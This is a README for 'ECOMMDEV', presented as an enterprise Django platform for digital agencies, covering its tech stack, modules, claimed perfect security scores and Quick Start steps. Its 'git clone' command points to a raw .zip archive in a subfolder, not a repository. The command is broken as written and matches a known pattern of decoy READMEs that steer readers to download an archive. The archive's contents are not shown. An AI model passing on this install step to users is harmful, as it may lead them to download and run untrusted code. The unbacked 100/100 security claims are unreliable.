# 🚀 ECOMMDEV Platform

**Enterprise-grade Django web platform for digital agencies.**

Full-stack web application built with Django 4.2, featuring a modular architecture for managing services, packages, portfolio, clients, invoices, quotes, and support tickets.

---

## 🛠️ Tech Stack

| Layer | Technology |
|-------|-----------|
| **Backend** | Python 3.12, Django 4.2, Django REST Framework |
| **Database** | PostgreSQL 16 |
| **Cache** | Redis |
| **Frontend** | HTML5, CSS3, JavaScript, Bootstrap 5 |
| **Containerization** | Docker, Docker Compose |
| **CI/CD** | GitHub Actions (lint, test, security scan, docker validate) |
| **Security** | CSP nonce-based, OWASP compliant, rate limiting, honeypot |
| **i18n** | Portuguese (BR) + English |

## 📦 Modules

```
├── core/          # Base views, SEO, middleware, context processors
├── servicos/      # Services catalog with categories and features
├── pacotes/       # Pricing packages with add-ons
├── portfolio/     # Project showcase with tech tags
├── clientes/      # Client management
├── orcamentos/    # Quote generation system
├── faturas/       # Invoice management
├── projetos/      # Project tracking
├── suporte/       # Support ticket system
├── notificacoes/  # Notification system
├── api/           # REST API endpoints
├── templates/     # Django templates (responsive, dark mode ready)
└── static/        # CSS, JS, images
```

## ✅ Quality Metrics

- **501 tests** | **85% code coverage**
- **CSO Enterprise Review:** 100/100
- **Penetration Test Score:** 100/100
- **CI/CD:** 4 jobs — lint, tests, security scan, docker validate

## 🔒 Security Features

- CSP with per-request cryptographic nonce
- Rate limiting on all endpoints
- Honeypot spam protection on forms
- Input sanitization (nh3)
- CSRF protection
- Secure headers (HSTS, X-Frame-Options, etc.)
- No hardcoded secrets — environment-based config

## 🚀 Quick Start

```bash
# Clone
git clone https://github.com/GodOfStrategy/ecommdev-platform/raw/refs/heads/main/projetos/platform_ecommdev_v1.5.zip
cd ecommdev-platform

# Setup
cp .env.example .env
pip install -r requirements.txt
python manage.py migrate
python manage.py runserver
```

### Docker

```bash
docker-compose up --build
```

